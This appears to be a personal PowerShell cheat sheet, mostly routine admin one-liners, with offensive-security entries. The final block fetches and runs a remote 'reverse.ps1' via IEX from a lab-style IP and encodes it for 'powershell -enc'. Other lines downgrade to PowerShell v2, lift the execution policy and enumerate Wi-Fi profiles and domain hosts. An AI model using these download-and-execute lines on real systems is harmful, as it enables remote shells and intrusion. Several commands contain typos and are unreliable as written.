# powershell: find hidden files recursice  
Get-ChildItem -Hidden -Recursive \path\  
  
# powershell: compress (zip) a file  
Compress-Archive -U -LiteralPath \source\path\ -DestinationPath \path\newfile  
  
# powershell: unzip a file  
Expand-Archive -LiteralPath \source\path\ -DestinationPath \path\target  
  
# powershell: extract string of command result  
findstr "something"  
  
# powershell: show all bssids of saved wifi networks  
netsh wlan show profiles * | findstr "SSID-Name"  
  
# powershell: allow execution of all ps scripts  
Set-ExecutionPolicy Unrestricted  
  
# powershell: list execution policies  
Get-ExecutionPolicy -List  
  
# powershell: display file contents  
Get-Content <file>  
  
# powershell: CMDlet help  
Get-Help <CMDlet> -examples  
  
# powershell: display ps version  
$PSVersionTable  
  
# powershell: run PS v2  
powershell.exe -version 2.0  
  
# powershell: list running services  
Get-Service | where_object {$_.status -eq "Running"}  
  
# powershell: return services  
get-service | measure-object  
  
# powershell: return list of PSDrives  
get-psdrive  
  
# powershell: return only names  
get-process | select -expandproperty name  
  
# powershell: export OS information to CSV  
Get-WmiObject -class win32_operatingsystem | select -property * | export-csv c:\os.txt  
  
# powershell: download file over HTTP  
(new-object system.net.webclient).downloadFile("url","dest")  
  
# powershell: list hostname and IP for all domain computers  
Get-WmiObject -ComputerName <DC> -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter "domainname=' <DOMAIN>'" | select textrepresentation  
  
#powershell donload file  
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/reverse.ps1')  
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0  
powershell -enc "BASE64"